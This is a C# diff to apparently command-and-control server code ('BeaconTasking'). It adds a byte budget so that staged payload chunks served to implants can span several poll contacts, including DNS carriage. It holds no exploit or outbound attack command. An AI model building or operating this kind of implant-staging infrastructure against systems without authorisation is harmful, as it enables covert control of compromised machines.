@@ -32,6 +32,16 @@ internal sealed class BeaconTasking
     // message cap with protobuf overhead to spare in both directions.
     public const int StagedChunkSize = 512 * 1024;
 
+    // The staged bytes one poll contact may answer across all its demands:
+    // the download arm's mirror of the upload arm's per-contact slice budget.
+    // A poll response carries the run beside the 4 MiB dispatch budget and
+    // the seal's base64 expansion (4/3 on the wire), so 6 MiB of payload
+    // keeps the whole response under the envelope's 16 MiB body cap with
+    // room for the handshake and the seam reports. A longer run ends its
+    // answer short of terminal and the implant re-demands from its proven
+    // seam on the next contact -- the same spanning the upload arm runs.
+    public const int MaxStagedRunBytes = 6 * 1024 * 1024;
+
     private readonly IImplantCertificateAuthority _ca;
     private readonly IAuditStore _audit;
     private readonly IArtifactStore _artifacts;
@@ -159,7 +169,7 @@ internal sealed class BeaconTasking
     /// waiting on chunks that will never come.
     /// </summary>
     public Task<IReadOnlyList<Frame>> StagedChunkRunAsync(Guid taskId, CancellationToken cancellationToken)
-        => StagedChunkRunAsync(taskId, resumeOffset: null, prefixSha256: null, cancellationToken);
+        => StagedChunkRunAsync(taskId, resumeOffset: null, prefixSha256: null, maxBytes: null, cancellationToken);
 
     /// <summary>
     /// The resuming half (architecture.md Sec 15.3, ADR-010): a demand that
@@ -172,33 +182,52 @@ internal sealed class BeaconTasking
     /// byte position, so placement never depends on chunk alignment -- the
     /// DNS carriage serves answer-sized slices, not 512 KiB ones.
     /// </summary>
+    public Task<IReadOnlyList<Frame>> StagedChunkRunAsync(
+        Guid taskId,
+        ulong? resumeOffset,
+        byte[]? prefixSha256,
+        CancellationToken cancellationToken)
+        => StagedChunkRunAsync(taskId, resumeOffset, prefixSha256, maxBytes: null, cancellationToken);
+
+    /// <summary>
+    /// The budgeted half the poll carriages run: a run longer than
+    /// <paramref name="maxBytes"/> of payload ends short of terminal, and the
+    /// demand's answer spans contacts -- the implant re-demands from its
+    /// proven seam and the next contact serves the next slice. The live
+    /// carriages pass no budget: their runs ride one frame per message, so a
+    /// whole run never packs into one body.
+    /// </summary>
     public async Task<IReadOnlyList<Frame>> StagedChunkRunAsync(
         Guid taskId,
         ulong? resumeOffset,
         byte[]? prefixSha256,
+        long? maxBytes,
         CancellationToken cancellationToken)
     {
         var staged = (await _artifacts.ForTaskAsync(taskId, cancellationToken))
             .FirstOrDefault(a => a.Name == StagedArtifacts.NameFor(taskId));
         var content = staged?.Content ?? Array.Empty<byte>();
         var start = ResolveResumeStart(content, resumeOffset, prefixSha256);
+        var end = maxBytes is { } budget
+            ? Math.Min(content.Length, start + budget)
+            : content.Length;
 
-        var frames = new List<Frame>((int)((content.Length - start) / StagedChunkSize) + 1);
+        var frames = new List<Frame>((int)((end - start) / StagedChunkSize) + 1);
         for (var offset = start; ; offset += StagedChunkSize)
         {
-            var end = Math.Min(offset + StagedChunkSize, content.Length);
-            var slice = new byte[end - offset];
+            var sliceEnd = Math.Min(offset + StagedChunkSize, end);
+            var slice = new byte[sliceEnd - offset];
             Array.Copy(content, offset, slice, 0, slice.Length);
             var chunk = new StagedChunk
             {
                 TaskId = new TaskId(taskId).ToString(),
                 Sequence = (ulong)((offset - start) / StagedChunkSize),
                 Offset = (ulong)offset,
-                Terminal = end == content.Length,
+                Terminal = sliceEnd == content.Length,
                 Data = ByteString.CopyFrom(slice),
             };
             frames.Add(new Frame { Payload = ByteString.CopyFrom(chunk.ToByteArray()) });
-            if (chunk.Terminal)
+            if (sliceEnd == end)
                 break;
         }
         return frames;
